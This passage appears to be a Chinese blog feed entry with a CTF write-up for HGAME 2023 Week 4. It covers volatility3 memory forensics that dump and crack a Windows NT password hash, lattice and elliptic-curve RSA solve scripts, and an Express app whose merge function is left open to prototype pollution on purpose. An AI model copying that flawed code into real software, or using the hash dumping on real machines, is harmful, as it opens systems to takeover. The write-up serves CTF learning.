    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 4</title>
    <link href="https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/"/>
    <id>https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/</id>
    <published>2023-02-06T13:43:16.000Z</published>
    <updated>2023-02-07T12:07:47.828Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 9</strong> / <strong>Total Rank: 8</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ezWin-variables-auth-7zip"><a href="#ezWin-variables-auth-7zip" class="headerlink" title="ezWin (variables/auth/7zip)"></a>ezWin (variables/auth/7zip)</h3><blockquote><p>非常常规的 Windows 内存取证，请使用 volatility3 </p><p>注：系列题目使用同一个镜像，使用下方任意链接下载一次即可 </p><p><a href="https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8">https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8</a> </p><p><a href="https://pan.quark.cn/s/9418099763d7">https://pan.quark.cn/s/9418099763d7</a> </p><p><a href="https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts">https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts</a></p></blockquote><p>使用volatility3分析Windows 10镜像。</p><p><strong>1. variables</strong></p><p>查看环境变量：</p><p><code>python vol.py -f win10_22h2_19045.2486.vmem windows.envars</code></p><p>得到第1个flag值：<code>hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</code>。</p><p><strong>2. 7zip</strong></p><p>查找7z文件：</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.filescan | grep -i 7z</code></p><p>找到 <code>flag.7z</code>，导出：</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.dumpfiles --virtaddr 0xd0064181c950</code></p><p>打开发现需要密码，内含文件 <code>crack_nt_hash_for_7z_pwd.txt</code>，文件名即提示，需要破解NTHash值得到解压密码。</p><p>提取账户信息：</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.hashdump</code></p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><p>使用cmd5查询得到 <code>84b0d9c9f830238933e7131d60ac6436</code> 对应明文为 <code>asdqwe123</code>，解压得到flag：<code>hgame&#123;e30b6984-615c-4d26-b0c4-f455fa7202e2&#125;</code>。</p><p><strong>3. auth</strong></p><p>查看命令行历史记录：</p><p><code>python vol.py -f win10_22h2_19045.2486.vmem windows.cmdline</code></p><p>发现提示 <code>flag2 is current user nthash...</code>，根据上一题hashdump得到的结果，flag为：<code>hgame&#123;84b0d9c9f830238933e7131d60ac6436&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LLLCG"><a href="#LLLCG" class="headerlink" title="LLLCG"></a>LLLCG</h3><blockquote><p>“我保留了大部分LCG的特征，但是也去除了一部分，这样才知道你们需要用到LLL”，”你是有意把它去除的吗”，”是出题的过程中我去除了一部分”，”是故意的还是不小心”，”是故意的”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.n = next_prime(<span class="number">2</span>**<span class="number">360</span>)</span><br><span class="line">        self.a = bytes_to_long(flag)</span><br><span class="line">        self.seed = randint(<span class="number">1</span>, self.n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = self.seed * self.a + randint(-<span class="number">2</span>**<span class="number">340</span>, <span class="number">2</span>**<span class="number">340</span>) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line"></span><br><span class="line">outputs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    outputs.append(lcg.<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(outputs))</span><br></pre></td></tr></table></figure></blockquote><p>出题失误，<code>self.seed = self.seed * self.a + randint(-2**340, 2**340) % self.n</code> 该句代码未加括号，且 $r \in [-2^{340},2^{340}]&lt; \text{seed} &lt;n$，直接做整除操作可以恢复 $a$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    m = c[i]//c[i-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="string">b&#x27;hgame&#123;W0w_you_know_the_hidden_number_problem&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="LLLCG-Revenge"><a href="#LLLCG-Revenge" class="headerlink" title="LLLCG Revenge"></a>LLLCG Revenge</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">&gt;<span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">LCG</span>():</span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">           self.n = next_prime(<span class="number">2</span>**<span class="number">360</span>)</span><br><span class="line">           self.a = bytes_to_long(flag)</span><br><span class="line">           self.seed = randint(<span class="number">1</span>, self.n-<span class="number">1</span>)</span><br><span class="line">   </span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">           self.seed = (self.seed * self.a + randint(-<span class="number">2</span>**<span class="number">340</span>, <span class="number">2</span>**<span class="number">340</span>)) % self.n</span><br><span class="line">           <span class="keyword">return</span> self.seed</span><br><span class="line">   </span><br><span class="line">   lcg = LCG()</span><br><span class="line">   </span><br><span class="line">   outputs = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">       outputs.append(lcg.<span class="built_in">next</span>())</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       f.write(<span class="built_in">str</span>(outputs))</span><br></pre></td></tr></table></figure></blockquote><p>修复后，有 $s_{i+1} \equiv as_i+r_i \pmod n,i \in [0,38)$，即 $s_{i+1}=as_i+r_i+k_in,i \in [0,38)$。</p><p>令 $A_i=s_i,B_i=-s_{i+1},x=a$，有 $-r_i = A_ix+B_i+k_in$，典型HNP问题，构建格：</p><p>$M = \begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \newline &amp; n &amp; &amp; &amp; &amp; &amp; \newline &amp; &amp;\ddots&amp; &amp; &amp; &amp; \newline &amp; &amp; &amp; n &amp; &amp; &amp; \newline A_0&amp;A_1&amp;\dots &amp; A_{38}&amp;K/n&amp; &amp; \newline B_0&amp;B_1&amp;\dots &amp; B_{38}&amp; &amp; K &amp; \newline \end{bmatrix}=\begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \newline &amp; n &amp; &amp; &amp; &amp; &amp; \newline &amp; &amp;\ddots&amp; &amp; &amp; &amp; \newline &amp; &amp; &amp; n &amp; &amp; &amp; \newline s_0&amp;s_1&amp;\dots &amp; s_{38}&amp;K/n&amp; &amp; \newline -s_1&amp;-s_2&amp;\dots &amp; -s_{39}&amp; &amp; K &amp; \newline \end{bmatrix}$</p><p>其中 $K$ 为 $r_i$ 的上界 $K=2^{340}$，则存在一个 $M$ 的整系数线性组合 $v$，用LLL算法可以得到 $v_k$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2348542582773833227889480596789337027375682548908319870707290971532209025114608443463698998384768703031935081</span></span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">t = <span class="number">39</span></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    A.append(c[i])</span><br><span class="line">    B.append(-c[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span>^<span class="number">340</span> </span><br><span class="line">X = n * identity_matrix(QQ, t)</span><br><span class="line">Z = matrix(QQ, [<span class="number">0</span>] * t + [K/n] + [<span class="number">0</span>]).transpose()</span><br><span class="line">Z2 = matrix(QQ, [<span class="number">0</span>] * (t+<span class="number">1</span>) + [K]).transpose()</span><br><span class="line"></span><br><span class="line">Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]])</span><br><span class="line">Y = block_matrix([[Y, Z, Z2]])</span><br><span class="line"></span><br><span class="line">Y = Y.LLL()</span><br><span class="line"></span><br><span class="line">k0 = ZZ(Y[<span class="number">1</span>, <span class="number">0</span>] % n)</span><br><span class="line">flag = ZZ(Y[<span class="number">1</span>, -<span class="number">2</span>] / (K/n) % n)</span><br><span class="line"><span class="keyword">assert</span>(k0 == (A[<span class="number">0</span>]*flag + B[<span class="number">0</span>]) % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Repair_modulus_prob1em_5o_HNP_Revenge&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ECRSA"><a href="#ECRSA" class="headerlink" title="ECRSA"></a>ECRSA</h3><blockquote><p>兔兔拜年时遇到了RSA，听说RSA还没有另一半于是把EC介绍给了他。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">Nbits = <span class="number">512</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_pubkey</span>(<span class="params">Nbits</span>):</span><br><span class="line">    p = getPrime(Nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(Nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomInteger(Nbits // <span class="number">2</span>)</span><br><span class="line">        b = getRandomInteger(Nbits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(<span class="number">4</span>*a**<span class="number">3</span> + <span class="number">27</span>*b**<span class="number">2</span>, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">    e = getPrime(<span class="number">64</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> n, E, e</span><br><span class="line"></span><br><span class="line">n, E, e = gen_pubkey(Nbits)</span><br><span class="line">pt = E.lift_x(Integer(x))</span><br><span class="line">ct = pt * e</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\na = <span class="subst">&#123;E.a4()&#125;</span>\nb = <span class="subst">&#123;E.a6()&#125;</span>\ne = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;ciphertext = <span class="subst">&#123;long_to_bytes(<span class="built_in">int</span>(ct.xy()[<span class="number">0</span>]))&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>给出点 $C=eP$ 的横坐标，根据椭圆曲线性质，点 $C$ 也在曲线上。</p><p>再利用 $e$ 对 $\#E(\mathbb{F}_p) \times \#E(\mathbb{F}_q)$ 取模逆即可得到 $E(\mathbb{Z}/n\mathbb{Z})$ 意义下的 $d$，再解密按照RSA方式解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">115192265954802311941399019598810724669437369433680905425676691661793518967453</span></span><br><span class="line">q = <span class="number">109900879774346908739236130854229171067533592200824652124389936543716603840487</span></span><br><span class="line">n = <span class="number">12659731371633323406361071735480743870942884407511647144758055911931321534333057725377899993936046070028289182446615763391740446071787318153462098556669611</span></span><br><span class="line">a = <span class="number">34573016245861396068378040882622992245754693028152290874131112955018884485688</span></span><br><span class="line">b = <span class="number">103282137133820948206682036569671566996381438254897510344289164039717355513886</span></span><br><span class="line">e = <span class="number">11415307674045871669</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;f\xb1\xae\x08`\xe8\xeb\x14\x8a\x87\xd6\x18\x82\xaf1q\xe4\x84\xf0\x87\xde\xedF\x99\xe0\xf7\xdcH\x9ai\x04[\x8b\xbbHR\xd6\xa0\xa2B\x0e\xd4\xdbr\xcc\xad\x1e\xa6\xba\xad\xe9L\xde\x94\xa4\xffKP\xcc\x00\x907\xf3\xea&#x27;</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">cx = <span class="built_in">int</span>(ciphertext.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">Ep = E.change_ring(GF(p))</span><br><span class="line">Eq = E.change_ring(GF(q))</span><br><span class="line">d = inverse_mod(e, Ep.order() * Eq.order())</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">cy2 = (cx^<span class="number">3</span> + a * cx + b) % n</span><br><span class="line"></span><br><span class="line">c = cy2</span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt; = PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f = a^e-c</span><br><span class="line">mps = f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt; = PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g = a^e-c</span><br><span class="line">mqs = g.monic().roots()</span><br><span class="line"></span><br><span class="line">cy_all = []</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x = mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y = mqq[<span class="number">0</span>]</span><br><span class="line">        cy_all.append(CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q]))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> cy <span class="keyword">in</span> cy_all:</span><br><span class="line">    C = E(cx,cy)</span><br><span class="line">    m, _ = (<span class="built_in">int</span>(d)*C).xy()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;ECC_4nd_RSA_also_can_be_combined&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h3><blockquote><p>ek1ng给协会成员写了一个在线共享日记本，不论是谁只要知道密码，都可以在上面记录自己的小秘密。不过好像他的js学的并不好导致无意中引入了漏洞，看来js也有很多安全问题。</p></blockquote><p>node.js Express框架，<code>app.js</code> ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="comment">// Prevent prototype pollution</span></span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Detected Prototype Pollution&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;./views&quot;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check password</span></span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span 